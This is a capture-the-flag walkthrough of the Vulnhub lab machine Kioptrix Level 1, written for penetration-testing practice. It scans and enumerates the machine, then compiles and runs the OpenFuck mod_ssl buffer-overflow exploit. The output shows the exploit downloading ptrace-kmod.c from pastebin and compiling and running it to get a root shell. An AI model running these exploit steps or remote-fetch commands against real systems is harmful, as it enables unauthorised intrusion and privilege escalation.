# Kioptrix Level 1 | Vulnhub
https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

### 1. Scan
```bash
kali@kali:~$ nmap -A -p- -T4 10.1.1.63
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 00:03 EDT
Nmap scan report for 10.1.1.63
Host is up (0.0034s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2020-10-27T05:07:00+00:00; +1h01m51s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
1024/tcp open  status      1 (RPC #100024)

Host script results:
|_clock-skew: 1h01m50s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.46 seconds
```
The machine is running SSH, SMBd and also Apache on port 80 and 443. The netbios name has been retrieved as KIOPTRIX.


### 2. Enumerate web server
Both the HTTP and HTTPS sites direct to the default Apache test page for v1.3.20.
Dirbusing the site reveals a few directories:
```bash
kali@kali:~$ dirb http://10.1.1.63/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Oct 27 00:16:13 2020
URL_BASE: http://10.1.1.63/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.1.1.63/ ----
+ http://10.1.1.63/~operator (CODE:403|SIZE:273)                                                                                                                                                   
+ http://10.1.1.63/~root (CODE:403|SIZE:269)                                                                                                                                                       
+ http://10.1.1.63/cgi-bin/ (CODE:403|SIZE:272)                                                                                                                                                    
+ http://10.1.1.63/index.html (CODE:200|SIZE:2890)                                                                                                                                                 
==> DIRECTORY: http://10.1.1.63/manual/                                                                                                                                                            
==> DIRECTORY: http://10.1.1.63/mrtg/                                                                                                                                                              
==> DIRECTORY: http://10.1.1.63/usage/                                                                                                                                                             
                                                                                                                                                                                                   
---- Entering directory: http://10.1.1.63/manual/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                   
---- Entering directory: http://10.1.1.63/mrtg/ ----
+ http://10.1.1.63/mrtg/index.html (CODE:200|SIZE:17318)                                                                                                                                           
                                                                                                                                                                                                   
---- Entering directory: http://10.1.1.63/usage/ ----
+ http://10.1.1.63/usage/index.html (CODE:200|SIZE:4258)                                                                                                                                           
                                                                                                                                                                                                   
-----------------
END_TIME: Tue Oct 27 00:16:48 2020
DOWNLOADED: 13836 - FOUND: 6
```
This is all default stuff though, so not much worth looking into on the actual server. The server is still of interest because it is a pretty old version, so worth looking into existing vulnerabilities in case any are applicable.
```bash
kali@kali:~$ searchsploit apache 1.3.20
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                                                   | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                                                 | php/remote/29316.py
Apache 1.3.20 (Win32) - 'PHP.exe' Remote File Disclosure                                                                                                          | windows/remote/21204.txt
Apache 1.3.6/1.3.9/1.3.11/1.3.12/1.3.20 - Root Directory Access                                                                                                   | windows/remote/19975.pl
Apache 1.3.x < 2.0.48 mod_userdir - Remote Users Disclosure                                                                                                       | linux/remote/132.c
Apache < 1.3.37/2.0.59/2.2.3 mod_rewrite - Remote Overflow                                                                                                        | multiple/remote/2237.sh
Apache < 2.0.64 / < 2.2.21 mod_setenvif - Integer Overflow                                                                                                        | linux/dos/41769.txt
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                                                  | linux/webapps/42745.py
Apache CouchDB < 2.1.0 - Remote Code Execution                                                                                                                    | linux/webapps/44913.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                                               | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                              | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                        | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                        | unix/remote/47080.c
Apache Struts < 1.3.10 / < 2.3.16.2 - ClassLoader Manipulation Remote Code Execution (Metasploit)                                                                 | multiple/remote/41690.rb
Apache Struts < 2.2.0 - Remote Command Execution (Metasploit)                                                                                                     | multiple/remote/17691.rb
Apache Tika-server < 1.18 - Command Injection                                                                                                                     | windows/remote/46540.py
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                                                 | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                                               | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                                                         | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                      | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                      | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                                                      | linux/dos/36906.txt
Oracle Java JDK/JRE < 1.8.0.131 / Apache Xerces 2.11.0 - 'PDF/Docx' Server Side Denial of Service                                                                 | php/dos/44057.md
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                                                  | linux/remote/34.pl
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Ignoring all the exploits that don't apply to this particular software setup or situation (aka Tomcat/Struts/local/DoS etc) there are only a couple of ones worth looking at. One that applies very closely to the machine are the "Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow" exploits, as the server is running mod_ssl 2.8.4, and searching for this version online confirms it is vulnerable.

### 3. Set up the exploit
Clone the latest version of the exploit and compile it.
```bash
kali@kali:~/Desktop/osc/kiol1$ git clone https://github.com/heltonWernik/OpenFuck.git
Cloning into 'OpenFuck'...
remote: Enumerating objects: 26, done.
remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 26
Unpacking objects: 100% (26/26), 14.12 KiB | 314.00 KiB/s, done.
kali@kali:~/Desktop/kiol1$ cd OpenFuck/
kali@kali:~/Desktop/kiol1/OpenFuck$ gcc OpenFuck.c -o OpenFuck -lcrypto
```

### 4. Get to root
The exploit had been updated, but was still fairly unreliable and I had to run it a few times before it worked.
```bash
kali@kali:~/Desktop/osc/kiol1/OpenFuck$ ./OpenFuck 0x6b 10.1.1.63 443 -c 50

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 50 of 50
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
race-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt 
--01:38:33--  https://pastebin.com/raw/C7v25Xr9
           => `ptrace-kmod.c'
Connecting to pastebin.com:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]

    0K ...                                                    @ 786.33 KB/s

01:38:35 (655.27 KB/s) - `ptrace-kmod.c' saved [4026]

ptrace-kmod.c:183:1: warning: no newline at end of file
[+] Attached to 7530
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root
```